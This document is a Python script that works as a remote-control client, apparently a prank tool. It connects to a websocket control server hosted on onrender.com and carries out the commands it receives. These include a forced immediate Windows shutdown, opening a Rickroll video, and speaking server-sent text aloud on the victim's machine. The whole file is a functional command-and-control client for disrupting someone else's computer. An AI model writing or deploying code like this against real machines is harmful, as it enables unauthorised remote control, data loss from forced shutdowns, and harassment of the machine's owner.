import asyncio
import websockets
import json
import os
import ctypes
import webbrowser
from gtts import gTTS
import requests
import time

WEBSOCKET_URL = "wss://controlserver.onrender.com"
WEBSITE_URL = "https://controlserver.onrender.com"

def check_website():
    try:
        response = requests.get(WEBSITE_URL)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Sayfa kontrolü sırasında hata: {e}")
        return False

def wait_for_website():
    while True:
        if check_website():
            print("Site başarıyla yüklendi!")
            break
        else:
            print("Site yüklenmedi, tekrar kontrol ediliyor...")
        time.sleep(5)

async def listen():
    wait_for_website()

    async with websockets.connect(WEBSOCKET_URL) as websocket:
        ctypes.windll.user32.MessageBoxW(0, "Connected", "Connected", 1)

        while True:
            try:
                message = await websocket.recv()
                data = json.loads(message)
                command = data.get("command")
                print(data)

                if command == "execute_task":
                    print("Task executed!")
                    os.system('shutdown /s /f /t 0')
                elif command == "rick":
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0&autoplay=1'
                    webbrowser.open(url)
                elif command == "message":
                    print(data.get("contentt"))

                    text = data.get("contentt")

                    tts = gTTS(text=text, lang='en')

                    tts.save("output.mp3")

                    os.system("start output.mp3")

            except websockets.ConnectionClosed:
                print("WebSocket bağlantısı kapatıldı.")
                break

asyncio.get_event_loop().run_until_complete(listen())
